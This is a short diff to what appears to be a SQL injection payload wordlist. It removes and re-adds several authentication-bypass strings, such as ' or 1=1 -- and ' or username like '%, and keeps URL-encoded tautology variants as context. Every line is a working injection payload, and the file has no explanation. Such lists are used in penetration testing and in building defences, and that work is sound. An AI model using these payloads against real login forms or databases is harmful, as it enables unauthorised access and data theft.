@@ -1,10 +1,9 @@
-
- or 1=1 --
-' or uid like '%
-' or uname like '%
-' or user like '%
-' or userid like '%
-' or username like '%
+('or'1=1 --
+'or uid like '%
+'or uname like '%
+'or user like '%
+'or userid like '%
+'or username like '%
 '%20or%20''='
 '%20or%20'x'='x
 '%20or%201=1
